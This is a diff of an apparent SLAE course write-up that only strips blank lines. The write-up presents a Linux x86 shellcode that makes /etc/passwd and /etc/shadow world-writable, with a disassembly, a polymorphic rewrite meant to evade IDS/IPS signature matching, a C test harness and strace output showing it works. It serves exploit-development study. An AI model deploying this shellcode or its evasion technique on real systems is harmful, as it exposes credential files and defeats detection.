@@ -43,7 +43,6 @@ For example, to clear a register you can use the following instruction:
 
 ```nasm
 xor eax, eax
-
 ```
 
 However, there are many more possibilities, like these:
@@ -61,7 +60,6 @@ dec EAX
 ; mov-sub
 mov EAX, 0xaabbccdd
 sub EAX, 0xaabbccdd
-
 ```
 
 In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use **Pattern Matching**, such as `IDS` and `IPS` systems.
@@ -74,7 +72,6 @@ First, here's the original shellcode in **Intel syntax**, since the shellcode on
 echo -n "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" > shellcode.bin
 
 ndisasm -b 32 -p intel shellcode.bin
-
 ```
 
 ```nasm
@@ -98,7 +95,6 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; ECX = permissions u=rw, g=rw, o=rw
 00000018  B00F              mov al,0xf
 0000001A  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">First it runs the instruction `chmod("/etc//passwd", 0666)` to change the permissions over `/etc/passwd`</figcaption>
@@ -120,7 +116,6 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; ECX = permissions u=rw, g=rw, o=rw
 00000030  B00F              mov al,0xf
 00000032  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">After that it runs the instruction `chmod("/etc//shadow", 0666)` to change the permissions over `/etc/shadow`</figcaption>
@@ -130,7 +125,6 @@ ndisasm -b 32 -p intel shellcode.bin
 00000034  31C0              xor eax,eax
 00000036  40                inc eax
 00000037  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">Finally it exits using `exit(EBX)`</figcaption>
@@ -149,7 +143,6 @@ int main(int argc, char *argv[])
   // EBX is equal to ESP, so it's just a random exit code
   exit(EBX);
 }
-
 ```
 
 It changes the permissions on the files `/etc/passwd` and `/etc/shadow` to `0666`. After that, it uses the `exit` syscall to terminate its own execution.
@@ -185,7 +178,6 @@ _start:
     push dword 0x776f6461
     push dword 0x68732f2f
     push esi
-
 ```
 
 <figcaption class="figure-caption">Remember that when you push a string to the stack, the bytes must be **reversed**, as **the stack grows downward**</figcaption>
@@ -233,7 +225,6 @@ _start:
     mov eax, edx
     inc eax
     int 0x80
-
 ```
 
 The original shellcode uses `57` bytes, while this one uses `52` bytes:
@@ -242,7 +233,6 @@ The original shellcode uses `57` bytes, while this one uses `52` bytes:
 objcopy -O binary -j .text ./shellcode.o /dev/stdout | wc -c
 
 # 52
-
 ```
 
 Although, I managed to make it smaller, it requires one **condition**:
@@ -275,7 +265,6 @@ For this reason, I also wrote a slightly different version that handles this cas
 +    mov eax, edx
      inc eax
      int 0x80
-
 ```
 
 Since I used the instruction `mul ecx` at the beginning, it means the registers`EDX` and `EAX` are set to 0.
@@ -286,7 +275,6 @@ In this case, I repeated two times the following instruction:
 
 ```nasm
 mov eax, edx
-
 ```
 
 Although not very small, at `56` bytes, this stable polymorphic version is still smaller than the original shellcode.
@@ -308,14 +296,12 @@ main() {
     int (*ret)() = (int(*)())code;
     ret();
 }
-
 ```
 
 To compile it I used `gcc`:
 
 ```bash
 gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
-
 ```
 
 Once I've run it, I could confirm it successfully changes the permissions over the files `/etc/passwd` and `/etc/shadow`:
@@ -327,7 +313,6 @@ rbct@slae:~/exam/assignment_6/1$ sudo strace -e trace=chmod ./test_polymorphic_s
 # chmod("/etc//passwd", 0666)             = 0
 
 rbct@slae:~/exam/assignment_6/1$
-
 ```
 
 As you can see, the syscalls `chmod` returned the value `0` in both cases, which means it managed to change the permissions and exit gracefully.
